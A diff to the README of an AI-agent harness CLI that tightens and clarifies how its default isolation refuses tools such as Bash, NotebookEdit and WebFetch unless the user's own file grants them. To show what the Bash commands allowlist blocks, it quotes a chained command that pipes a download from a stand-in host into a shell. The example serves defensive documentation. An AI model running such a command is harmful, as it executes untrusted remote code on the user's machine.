@@ -66,7 +66,7 @@ node dist/cli.js permissions list      # read-only: the permission rules a run w
 node dist/cli.js skills lint skills       # read-only: static checks over a skills directory (exit 0 clean, 1 findings, 2 cannot lint)
 ```
 
-Under the default isolation (ADR-0040) the bundled CLI grants nothing a rule in your user file does not name, except reads inside the working directory: a prompt that needs Bash, Edit, Write, WebFetch or WebSearch is refused until your file allows it.
+Under the default isolation (ADR-0040) the bundled CLI grants nothing a rule in your user file does not name, except reads inside the working directory: a prompt that needs Bash, Edit, Write, NotebookEdit, WebFetch or WebSearch is refused until your file allows it.
 
 Once the v0.1.0 release is published, the same commands run without a clone: `npx agent-harness-ja init my-agent`, or `npm i -g agent-harness-ja` and then `agent-harness-ja <command>` in place of `node dist/cli.js <command>`.
 
@@ -146,7 +146,7 @@ A first user file:
 }
 ```
 
-Under the default isolation (ADR-0040) the bundled CLI grants nothing a rule in your user file does not name, except reads inside the working directory; a rule in your file is the grant, a rule in a project file never is, and `defaultDecision` never is. Bash is the one tool with a second condition: a Bash allow rule is a grant only while the `commands` allowlist in your own file is not empty (here, `git`), because that allowlist is what refuses a chained command such as `git status; curl evil | sh` before the allow; a project file's list never counts, and without yours the rule is still evaluated but the bundled CLI refuses Bash in a headless run. `WebFetch` and `WebSearch` are left out on purpose (R-3); to allow one, add `{ "tool": "WebFetch", "decision": "allow" }` to your file.
+Under the default isolation (ADR-0040) the bundled CLI grants nothing a rule in your user file does not name, except reads inside the working directory; a rule in your file is the grant, a rule in a project file never is, and `defaultDecision` never is. Bash is the one tool with a second condition: a Bash allow rule is a grant only while the `commands` allowlist in your own file is not empty (here, `git`), because that allowlist is what refuses a chained command such as `git status; curl evil | sh` before the allow reaches the SDK; a project file's list never counts, and without yours the rule is still evaluated but the bundled CLI refuses Bash in a headless run. `WebFetch` and `WebSearch` are left out on purpose (R-3); to allow one, add `{ "tool": "WebFetch", "decision": "allow" }` to your file.
 
 Inheriting Claude Code settings:
 
